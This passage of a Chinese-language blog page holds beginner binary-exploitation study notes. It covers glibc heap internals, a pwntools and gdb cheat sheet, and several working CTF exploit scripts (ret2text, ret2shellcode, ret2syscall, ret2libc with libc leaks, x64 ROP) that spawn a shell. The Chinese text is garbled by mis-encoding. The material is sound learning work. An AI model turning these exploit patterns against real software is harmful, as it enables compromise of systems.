alt="image-20201118173315748"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118223608385.png" alt="image-20201118223608385"></p><h2 id="å †ç®¡ç†å™¨"><a href="#å †ç®¡ç†å™¨" class="headerlink" title="å †ç®¡ç†å™¨"></a>å †ç®¡ç†å™¨</h2><ul><li>é€»è¾‘é“¾è¡¨ï¼šæŒ‡é’ˆè¿èµ·æ¥,æŠŠåŒç±»çš„<code>chunk</code>è¿èµ·æ¥</li><li>ç‰©ç†é“¾è¡¨ï¼šé€šè¿‡<code>size</code>åŸŸç»„ç»‡ç›¸é‚»<code>chunk</code>ä¹‹é—´çš„å…³ç³»ï¼Œåˆ¤æ–­ç›¸é‚»æ˜¯å¦ä¸º<code>free chunk</code>ï¼Œè‹¥æ˜¯ï¼Œåˆ™åˆå¹¶</li></ul><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a><strong>arena</strong></h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118224006678.png" alt="image-20201118224006678"></p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a><strong>chunk</strong></h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118230656646.png" alt="image-20201118230656646"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110607276.png" alt="image-20201119110607276"></p><h4 id="malloced-chunk"><a href="#malloced-chunk" class="headerlink" title="malloced chunk"></a><strong>malloced chunk</strong></h4><p><strong>chunk</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118233221511.png" alt="image-20201118233221511"></p><p><code>pre size</code>:è®°å½•ä¸Šä¸€ä¸ªfree chunkçš„å¤§å°ï¼Œè‹¥ä¸Šä¸€ä¸ªchunkåœ¨ç”¨ï¼Œåˆ™<code>pre size</code>å°†è¢«åˆå¹¶</p><p><code>size</code>:æ•´ä¸ªchunk çš„å¤§å°</p><p><strong>top chunk</strong></p><p>ä»æ“ä½œç³»ç»Ÿæ‰¹å‘çš„ä¸åˆ†ç»™ç”¨æˆ·çš„chunk</p><h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a><strong>free chunk</strong></h4><p>small bin chunk</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119105945419.png" alt="image-20201119105945419"></p><p>large bin chunk</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110352335.png" alt="image-20201119110352335"></p><p>fast bin chunk</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110501531.png" alt="image-20201119110501531"></p><p><strong>pre size å¤ç”¨</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119114224011.png" alt="image-20201119114224011"></p><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a><strong>bin</strong></h3><p>åˆ†é…æ–¹å¼ï¼š<code>fastbin</code> â€”&gt;<code>unsorted bin</code>â€”&gt;<code>small bin</code>/<code>large bin</code> </p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162311702.png" alt="image-20201119162311702"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115539452.png" alt="image-20201119115539452"></p><h4 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h4><h4 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a><strong>fastbins</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162151833.png" alt="image-20201119162151833"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163702351.png" alt="image-20201119163702351"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119120748019.png" alt="image-20201119120748019"></p><p><strong>binçš„åŒå‘é“¾è¡¨</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a><strong>unsorted bin</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163039733.png" alt="image-20201119163039733"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163232880.png" alt="image-20201119163232880"></p><h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a><strong>small bins</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163209378.png" alt="image-20201119163209378"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163319068.png" alt="image-20201119163319068"></p><h4 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163433718.png" alt="image-20201119163433718"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163457182.png" alt="image-20201119163457182"></p><p><strong>å®ä¾‹</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115142092.png" alt="image-20201119115142092"></p><h1 id="å †æ¼æ´"><a href="#å †æ¼æ´" class="headerlink" title="å †æ¼æ´"></a>å †æ¼æ´</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163935171.png" alt="image-20201119163935171"></p><p><strong>fastbin</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201121183321818.png" alt="image-20201121183321818"></p><p><strong>unsorted bin</strong></p><h1 id="å·¥å…·å­¦ä¹ "><a href="#å·¥å…·å­¦ä¹ " class="headerlink" title="å·¥å…·å­¦ä¹ "></a>å·¥å…·å­¦ä¹ </h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Import pwntools</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#Local communication</span></span><br><span class="line">io = process(<span class="string">"./a.out"</span>)</span><br><span class="line"><span class="comment">#Telecommunication</span></span><br><span class="line">io = remote(<span class="string">"ip"</span>,port)</span><br><span class="line"><span class="comment">#Receive message</span></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvuntil(<span class="string">b":"</span>)</span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>,drop = <span class="literal">True</span>)</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#Send message</span></span><br><span class="line">io.sendline(<span class="string">b"abc"</span>)</span><br><span class="line">io.send(p32(<span class="number">0</span>)+<span class="string">b"\x0a"</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str)</span><br><span class="line"><span class="comment">#Interactive</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">shellcraft.sh()  <span class="comment">#in sh environment</span></span><br><span class="line">shellcraft.amd64.sh() <span class="comment">#64 bit</span></span><br><span class="line">asm(shellcraft.sh()) <span class="comment">#machine code</span></span><br><span class="line">asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b'a'</span>) <span class="comment">#if the length is less than 112,then it will be supplemented whith a. </span></span><br><span class="line"><span class="comment">#if you want to attack the 64 bit,pls add it</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#find strings</span></span><br><span class="line">elf = ELF(<span class="string">"./filename"</span>)</span><br><span class="line">hex(next(elf.search(<span class="string">b"/bin/sh"</span>)))</span><br><span class="line"><span class="comment">#elf file</span></span><br><span class="line">elf = ELF(<span class="string">"./file"</span>)</span><br><span class="line">hex(elf.got[<span class="string">"puts"</span>])</span><br><span class="line">hex(elf.plt[<span class="string">"system"</span>])</span><br><span class="line">hex(elf.symbols[<span class="string">"buf2"</span>])</span><br><span class="line"><span class="comment">#flat</span></span><br><span class="line">flat([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line"><span class="comment">#generate data</span></span><br><span class="line">cyclic(<span class="number">60</span>)</span><br><span class="line"><span class="comment">#byte data</span></span><br><span class="line">p32(<span class="number">1234</span>)</span><br><span class="line">\xd2\x04\x00\x00</span><br><span class="line">u32(<span class="string">"\xd2\x04\x00\x00"</span>)</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#start</span></span><br><span class="line">gdb file</span><br><span class="line">start</span><br><span class="line"><span class="comment">#run the executable</span></span><br><span class="line">run</span><br><span class="line"><span class="comment">#backtrace</span></span><br><span class="line">backtrace</span><br><span class="line"><span class="comment">#return</span></span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"><span class="comment">#breakpoint</span></span><br><span class="line">b main</span><br><span class="line">b <span class="keyword">function</span></span><br><span class="line">b *0x</span><br><span class="line"><span class="comment">#information for breakpoint</span></span><br><span class="line">info b</span><br><span class="line"><span class="comment">#delete the breakpoint</span></span><br><span class="line">d num</span><br><span class="line"><span class="comment">#run</span></span><br><span class="line">r </span><br><span class="line"><span class="comment">#next step over</span></span><br><span class="line">n </span><br><span class="line"><span class="comment">#step in </span></span><br><span class="line">s  </span><br><span class="line"><span class="comment">#stack</span></span><br><span class="line">stack size</span><br><span class="line">stack 24</span><br><span class="line"><span class="comment">#virtual memory map</span></span><br><span class="line"><span class="comment">#to look rwx segment</span></span><br><span class="line">vmmap</span><br><span class="line"><span class="comment">#plt </span></span><br><span class="line">plt</span><br><span class="line">x p</span><br><span class="line">x/20 p</span><br><span class="line"><span class="comment">#got</span></span><br><span class="line">got</span><br><span class="line"><span class="comment">#chunk</span></span><br><span class="line">fastbin</span><br><span class="line">heap</span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">b *<span class="variable">$rebase</span>(0x18540)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">attach pid</span><br><span class="line"><span class="built_in">return</span></span><br></pre></td></tr></table></figure><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">G  ç›´æ¥è·³è½¬åœ°å€</span><br><span class="line">shift+f12  æ‰“å¼€å­—ç¬¦ä¸²çª—å£</span><br><span class="line">shift+E  æå–å­—ç¬¦ä¸²</span><br><span class="line">n  é‡å‘½åå˜é‡</span><br></pre></td></tr></table></figure><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary filename --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libcbase + one_gadget_address</span><br></pre></td></tr></table></figure><h1 id="ç»ƒä¹ é¢˜"><a href="#ç»ƒä¹ é¢˜" class="headerlink" title="ç»ƒä¹ é¢˜"></a>ç»ƒä¹ é¢˜</h1><p>éå¸¸ç®€å•ï¼Œé€‚åˆå…¥é—¨</p><h2 id="æ ˆæº¢å‡º"><a href="#æ ˆæº¢å‡º" class="headerlink" title="æ ˆæº¢å‡º"></a>æ ˆæº¢å‡º</h2><h3 id="ret2text-1"><a href="#ret2text-1" class="headerlink" title="ret2text"></a>ret2text</h3><p>ç›´æ¥æœ‰åé—¨å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŠŠåƒåœ¾æ•°æ®å¡«æ»¡è¦†ç›–ebpï¼Œç„¶åè®©è¿”å›åœ°å€è¿”å›åé—¨å‡½æ•°çš„åœ°å€å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2text"</span>)</span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">20</span> + p32(<span class="number">0x8048522</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2shellcode-1"><a href="#ret2shellcode-1" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>è‡ªå·±å†™å…¥shellcode(bss)ï¼Œç„¶åæº¢å‡ºåœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line"></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b'a'</span>)</span><br><span class="line">payload = shellcode + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>ROPgadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x80bb196</span></span><br><span class="line">pop_edx = <span class="number">0x806eb90</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">payload =flat([ <span class="string">b'A'</span>* <span class="number">112</span> , pop_eax , <span class="number">0xb</span> ,pop_edx, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x80be408</span> ,int_80])</span><br><span class="line"></span><br><span class="line">print(io.recv())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201107232027030.png" alt="image-20201107232027030"></p><p>æ ˆæº¢å‡ºï¼Œæœ‰/bin/shå­—ç¬¦ä¸² system@plt æ„é€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">io = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">bin_sh = next(elf.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(system_plt) + <span class="string">b'BBBB'</span> + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p>æ ˆæº¢å‡º æ— /bin/shå­—ç¬¦ä¸²ï¼Œä½†bssæ®µå¯å†™</p><p>ç¬¬ä¸€ç§</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112215451308.png" alt="image-20201112215451308"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">bss = <span class="number">0x804a080</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(gets_plt) + p32(system_plt) + p32(bss) + p32(bss)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/sh\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113183137009.png" alt="image-20201113183137009"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">bss = <span class="number">0x804a080</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x804843d</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(gets_plt) + p32(pop_ebx_ret) + p32(bss) + p32(system_plt) + p32(pop_ebx_ret) + p32(bss)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/bash\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="retlibc3"><a href="#retlibc3" class="headerlink" title="retlibc3"></a>retlibc3</h3><p>æ ˆå˜é‡çš„ç»“æ„</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202023659.png" alt="image-20201113202023659"></p><p>æ ˆçš„ç»“æ„</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202640601.png" alt="image-20201113202640601"></p><p>æ³„éœ²libc</p><p>åº”è¯¥æ˜¯libcä¸åŒå¯¼è‡´æ‰“ä¸é€š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts = libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">system = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str(put))</span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>)</span><br><span class="line">libcbase = int(io.recvuntil(<span class="string">b"\n"</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - puts</span><br><span class="line">payload = flat( cyclic(<span class="number">60</span>), libcbase + system , <span class="number">0xdeadbeef</span> ,next(elf.search(<span class="string">b"sh\x00"</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn2-x64"><a href="#pwn2-x64" class="headerlink" title="pwn2_x64"></a>pwn2_x64</h3><p>æ ˆå›¾</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116200344612.png" alt="image-20201116200344612"></p><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><ol><li>é€šè¿‡libcæ³„éœ²ç³»ç»Ÿå‡½æ•°ï¼Œé¦–å…ˆè·å¾—åŸºåœ°å€å¯ä»¥é€šè¿‡ä»¥ä¸‹æ¥æ³„éœ²ï¼ˆ1ï¼‰é€šè¿‡ROPç³»ç»Ÿè°ƒç”¨ï¼ˆ2ï¼‰ç›´æ¥å‡½æ•°writeæ³„éœ²</li><li>æ— sh ï¼ˆ1ï¼‰ç¬¦å·æœ‰æ— sh  ï¼ˆ2ï¼‰é€šè¿‡ROPå°†/bin/shå†™å…¥ ï¼ˆ3ï¼‰libcä¸­/bin/sh</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./level3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">vulfun_addr = <span class="number">0x0804844B</span>  </span><br><span class="line">write_plt = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(write_plt) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b"Input:\n"</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>)) <span class="comment">#Specify four bytes</span></span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>] + libc_base</span><br><span class="line">sh_addr = libc_base + next(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"><span class="comment">#libc_write=libc.symbols['write']</span></span><br><span class="line"><span class="comment">#libc_system=libc.symbols['system']</span></span><br><span class="line"><span class="comment">#libc_sh=next(libc.search(b'/bin/sh'))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr=write_addr-libc_write+libc_system </span></span><br><span class="line"><span class="comment">#sh_addr=write_addr-libc_write+libc_sh</span></span><br><span class="line">payload2 = cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system_addr) + <span class="string">b'A'</span>*<span class="number">4</span> + p32(sh_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn3-x64"><a href="#pwn3-x64" class="headerlink" title="pwn3_x64"></a>pwn3_x64</h3><p>ä¸¤æ¬¡ROP</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174620932.png" alt="image-20201117174620932"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174719721.png" alt="image-20201117174719721"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#context.log_level="debug" </span></span><br><span class="line">elf=ELF(<span class="string">"level3_x64"</span>) </span><br><span class="line">write_plt=elf.symbols[<span class="string">"write"</span>] </span><br><span class="line">write_got=elf.got[<span class="string">"write"</span>] </span><br><span class="line">vul_addr=elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">p = process(<span class="string">"./level3_x64"</span>)</span><br><span class="line"><span class="comment">#p=remote("47.116.107.8",9883) </span></span><br><span class="line">p.recvuntil(<span class="string">b"Input:\n"</span>) </span><br><span class="line">pop_rdi_addr=<span class="number">0x00000000004006b3</span>   <span class="comment">#0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x00000000004006b1</span>      <span class="comment">#0x00000000004006b1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line">payload1 = cyclic(<span class="number">0x80</span>+<span class="number">8</span>) + p64(pop_rdi_addr) + p64(<span class="number">1</span>) + p64(pop_rsi_r15_addr) + p64(write_got) + p64(<span class="string">'deadbeef'</span>) + p64(write_plt) + p64(vul_addr) </span><br><span class="line">p.sendline(payload1) </span><br><span class="line">t=p.recv(<span class="number">8</span>)</span><br><span class="line">write_addr=u64(t[<span class="number">0</span>:<span class="number">8</span>]) </span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>) </span><br><span class="line">offset=write_addr-libc.symbols[<span class="string">"write"</span>] </span><br><span class="line">sys_addr=offset+libc.symbols[<span class="string">"system"</span>] </span><br><span class="line">bin_addr=offset+next(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">payload2 = cyclic(<span class="number">0x80</span>+<span class="number">8</span>) + p64(pop_rdi_addr) + p64(bin_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ 